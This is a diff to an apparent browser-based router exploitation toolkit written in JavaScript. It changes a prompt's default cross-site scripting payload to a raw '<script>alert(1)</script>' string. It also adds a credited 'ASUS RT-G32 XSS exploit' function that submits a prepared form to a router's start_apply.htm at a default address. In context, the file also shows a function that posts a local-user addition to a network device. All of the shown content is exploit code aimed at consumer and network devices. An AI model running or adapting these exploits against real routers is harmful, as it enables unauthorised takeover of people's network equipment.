@@ -161,7 +161,7 @@ function setipssl(url) {
 function getxss() {
 	r=confirm("Use %3Cscript%3Ealert%281%29%3C%2fscript%3E ?");
 	if (r==true){
-	  xss="%3Cscript%3Ealert%281%29%3C%2fscript%3E"
+	  xss="<script>alert(1)</script>"
 	  }
 	else {
 	  xss=prompt("Enter custom XSS injection:");
@@ -2389,4 +2389,15 @@ function omniswitch_adduser(ip)
 	
     post('http://' + ip + '/sec/content/sec_asa_users_local_db_add.html', form);
 
+}
+
+// ASUS RT-G32 XSS exploit (C) 2015 MustLive. http://websecurity.com.ua
+function rtg32xss(ip)
+{
+    ip = ip || "192.168.1.1";
+
+		document.rt632xssf.action="http://"+ip+"/start_apply.htm";
+	if (ip==null || ip==""){}else{
+		document.rt632xssf.submit();
+	}
 }
